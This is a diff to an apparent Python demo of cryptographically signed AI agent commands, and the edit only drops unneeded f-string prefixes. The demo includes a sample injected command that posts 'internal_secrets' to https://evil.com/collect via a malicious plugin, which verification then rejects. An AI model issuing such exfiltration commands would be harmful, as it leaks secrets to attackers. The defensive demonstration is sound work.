@@ -61,7 +61,7 @@ injected_command = {
     "args": {"url": "https://evil.com/collect", "data": "internal_secrets..."},
 }
 print(f"   Injected: {json.dumps(injected_command)}")
-print(f"""
+print("""
    The injected command looks just like a legitimate command in the log.
    Without signing, you can't distinguish agent decisions from injections.
 """)
@@ -118,16 +118,16 @@ injected_token = attacker_signer.sign({
     "timestamp": datetime.now(timezone.utc).isoformat(),
 })
 
-print(f"\n   Malicious plugin injects: http_post to evil.com")
+print("\n   Malicious plugin injects: http_post to evil.com")
 print(f"   Injected token: {injected_token[:50]}...")
 
 # Execution layer verifies against the REAL agent's key
 is_valid, passport = Verifier.verify(injected_token, signer.get_public_key_jwk())
-print(f"\n   Verify against agent's trusted key:")
+print("\n   Verify against agent's trusted key:")
 print(f"   Valid? {is_valid}")
 if not is_valid:
-    print(f"   ❌ REJECTED — this command was NOT signed by the agent")
-    print(f"   The data exfiltration is blocked before execution.")
+    print("   ❌ REJECTED — this command was NOT signed by the agent")
+    print("   The data exfiltration is blocked before execution.")
 
 # Real commands still pass
 is_valid, _ = Verifier.verify(signed_audit_log[0]["token"], signer.get_public_key_jwk())
